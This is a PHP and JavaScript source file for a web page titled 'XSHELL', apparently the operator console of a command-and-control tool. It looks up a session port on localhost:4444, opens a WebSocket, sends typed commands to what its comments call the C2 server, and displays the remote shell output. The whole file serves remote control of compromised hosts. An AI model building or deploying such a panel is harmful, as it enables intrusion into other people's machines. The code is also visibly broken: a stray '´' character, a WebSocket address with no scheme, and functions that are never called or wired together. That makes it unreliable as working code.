<?php
    $sid = $_GET['sid'];
?>

<div class="right-pane">
    <h3>XSHELL</h3>
    <div class="shellbody">
        <div class="shell" id="shell-output">
            <!-- SHELL OUTPUT IS LOADING HERE -->
        </div>
        <div class="input">
            <input type="text" id="command-input" placeholder="Enter your command">
            <button id="execute-button">Execute</button>
        </div>
    </div>
    <script>
    	function extractSID() { // Extract SID
    	    const url = window.location.href;
    	    const regex = /sid=(\d+)/; 
    	    const match = url.match(regex);
     	   return match ? match[1] : null; // (SID = XID) SID / NULL -> Web Shell Session Port
    	}

    	function getPort() { // Receive Web Shell Port
    	    const sid = extractSID();
     	   if (!sid) {
     	       console.error('SID not found.');
     	       return;
     	   }

      	  const xhr = new XMLHttpRequest();
      	  xhr.open('GET', `http://localhost:4444//xSLIENTx/${sid}`); // Change IP + Port
     	  xhr.onreadystatechange = function () {
            if (xhr.readyState === XMLHttpRequest.DONE) {
                if (xhr.status === 200) {
                    const port = parseInt(xhr.responseText);
                    startWebSocket(port);
                } else {
                    console.error('Failed To Get Port. ERROR x001'); 
                }
       	     }
          };
          xhr.send();
          }
          
    ´     function startWebSocket(port) { // Start Web Socket 
            //const socket = new WebSocket(`ws://127.0.0.1:${port}`);
            const socket = new WebSocket('127.0.0.1:1202'); // Change IP + Port

            socket.addEventListener('open', (event) => {

              document.getElementById('execute-button').addEventListener('click', () => {
                const commandInput = document.getElementById('command-input');
                const command = commandInput.value;

    	        socket.send(command); // Send Command -> C2 Server

     	        commandInput.value = ''; // Empty Value
     	      });

     	      socket.addEventListener('message', (event) => { // Data Received
      	        const shellOutput = document.getElementById('shell-output');
    	        const outputLine = document.createElement('pre');
    	        outputLine.textContent = event.data;

      	        shellOutput.appendChild(outputLine); // Received Shell Output -> Output
     	      });
            });
        </script>		
    </div>


<script type="text/javascript" src="/js/script.js" defer></script>
<script type="text/javascript" src="/js/xscript.js" defer></script>
<script type="text/javascript" src="/js/client_interval.js" defer></script>